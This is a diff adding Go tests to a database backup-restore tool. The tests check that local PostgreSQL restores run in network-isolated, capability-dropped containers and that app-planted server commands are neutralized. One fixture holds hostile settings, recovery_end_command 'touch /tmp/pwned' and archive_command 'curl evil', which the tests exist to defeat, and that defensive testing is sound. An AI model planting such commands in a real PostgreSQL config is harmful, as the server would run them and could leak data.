@@ -120,6 +120,8 @@ func (f *fakeDocker) run(_ context.Context, stdin io.Reader, stdout io.Writer, a
 		switch {
 		case last == "select 1":
 			_, _ = io.WriteString(stdout, "1\n")
+		case last == "select pg_is_in_recovery()":
+			_, _ = io.WriteString(stdout, "f\n")
 		case strings.Contains(last, "pg_stat_user_tables"):
 			_, _ = io.WriteString(stdout, "4|1234\n")
 		}
@@ -213,5 +215,118 @@ func TestRestoreRefusesImageFromMetadata(t *testing.T) {
 		if _, err := (&Vault{}).image(map[string]string{"hangar-image": img}); err == nil {
 			t.Errorf("%s accepted", img)
 		}
+	}
+}
+
+// runCalls are the docker run calls, in order.
+func (f *fakeDocker) runCalls() []string {
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	var out []string
+	for _, c := range f.calls {
+		if strings.HasPrefix(c, "run ") {
+			out = append(out, c)
+		}
+	}
+	return out
+}
+
+// isolated reports a docker run with no network and the hardened flags.
+func isolated(call string) bool {
+	return strings.Contains(call, "--network none") && hardenedCall(call)
+}
+
+func hardenedCall(call string) bool {
+	return strings.Contains(call, "--cap-drop ALL") && strings.Contains(call, "--security-opt no-new-privileges") &&
+		strings.Contains(call, "--pids-limit") && !strings.Contains(call, "--privileged")
+}
+
+// SEC-007: a dump is restored as the superuser, so the app's functions
+// run while it loads: the container has no network and drops its
+// capabilities until the data is in; only then is it started again,
+// still hardened, on 127.0.0.1.
+func TestRestoreLocalDumpIsIsolated(t *testing.T) {
+	id, _ := age.GenerateX25519Identity()
+	key := archive.DumpKey(archive.ClassDaily, "loja", "db", time.Now().Add(-time.Hour).UTC())
+	dir := writeDir(t, map[string][]byte{key: sealed(t, id, []byte("PGDMP dados"), false)}, map[string]string{})
+	fd := &fakeDocker{}
+	v := New(Dir{Root: dir}, []age.Identity{id})
+	v.Docker = fd.run
+	r, err := v.RestoreLocal(context.Background(), RestoreOptions{Project: "loja", Service: "db", Dump: true, Port: 54329})
+	if err != nil {
+		t.Fatal(err)
+	}
+	runs := fd.runCalls()
+	if len(runs) != 2 || !isolated(runs[0]) || strings.Contains(runs[0], " -p ") {
+		t.Fatalf("the restore must run with no network:\n%s", strings.Join(runs, "\n"))
+	}
+	if !hardenedCall(runs[1]) || strings.Contains(runs[1], "--network none") || !strings.Contains(runs[1], "-p 127.0.0.1:54329:5432") ||
+		!strings.Contains(runs[1], "-v "+r.Volume+":") {
+		t.Fatalf("the finished database is published on 127.0.0.1, same volume, hardened:\n%s", runs[1])
+	}
+	all := strings.Join(fd.calls, "\n")
+	if strings.Index(all, "pg_restore") > strings.Index(all, runs[1]) {
+		t.Fatal("the port must open only after the dump is in")
+	}
+}
+
+// SEC-006: the app owns its database's superuser and can set, with ALTER
+// SYSTEM, commands PostgreSQL runs (recovery_end_command,
+// archive_command...). A point-in-time restore on the operator's computer
+// neutralizes them at the end of postgresql.auto.conf and replays the WAL
+// with no network.
+func TestRestoreLocalPITRNeutralizesAppCommands(t *testing.T) {
+	id, _ := age.GenerateX25519Identity()
+	at := time.Now().Add(-time.Hour).UTC()
+	seg := "000000010000000000000002"
+	var base bytes.Buffer
+	tw := tar.NewWriter(&base)
+	for name, body := range map[string]string{
+		"PG_VERSION":           "18\n",
+		"backup_label":         "START WAL LOCATION: 0/2000028 (file " + seg + ")\n",
+		"postgresql.auto.conf": "recovery_end_command = 'touch /tmp/pwned'\narchive_command = 'curl evil'", // no final newline
+	} {
+		_ = tw.WriteHeader(&tar.Header{Name: name, Mode: 0o600, Size: int64(len(body)), Typeflag: tar.TypeReg})
+		_, _ = tw.Write([]byte(body))
+	}
+	_ = tw.Close()
+	dir := writeDir(t, map[string][]byte{
+		archive.BaseKey("loja", "db", at, seg): sealed(t, id, base.Bytes(), true),
+		archive.WALKey("loja", "db", seg):      sealed(t, id, []byte("wal"), true),
+	}, map[string]string{})
+	fd := &fakeDocker{}
+	v := New(Dir{Root: dir}, []age.Identity{id})
+	v.Docker = fd.run
+	r, err := v.RestoreLocal(context.Background(), RestoreOptions{Project: "loja", Service: "db", Port: 54329})
+	if err != nil || r.Mode != "pitr" {
+		t.Fatalf("%+v %v", r, err)
+	}
+	var conf string
+	tr := tar.NewReader(bytes.NewReader(fd.in))
+	for {
+		h, err := tr.Next()
+		if err != nil {
+			break
+		}
+		if h.Name == "postgresql.auto.conf" {
+			b, _ := io.ReadAll(tr)
+			conf = string(b)
+		}
+	}
+	for _, want := range []string{"recovery_end_command = ''", "archive_command = ''", "archive_mode = 'off'", "shared_preload_libraries = ''"} {
+		i := strings.LastIndex(conf, want)
+		if i < 0 || i < strings.LastIndex(conf, "touch /tmp/pwned") || i < strings.LastIndex(conf, "curl evil") {
+			t.Fatalf("%q must come after the app's settings:\n%s", want, conf)
+		}
+	}
+	if !strings.Contains(conf, "'curl evil'\n") {
+		t.Fatalf("the app's last line must end before ours:\n%s", conf)
+	}
+	runs := fd.runCalls()
+	if len(runs) != 3 || !isolated(runs[0]) || !isolated(runs[1]) || strings.Contains(runs[1], " -p ") {
+		t.Fatalf("staging and recovery must run with no network:\n%s", strings.Join(runs, "\n"))
+	}
+	if !hardenedCall(runs[2]) || !strings.Contains(runs[2], "-p 127.0.0.1:54329:5432") {
+		t.Fatalf("published after recovery:\n%s", runs[2])
 	}
 }
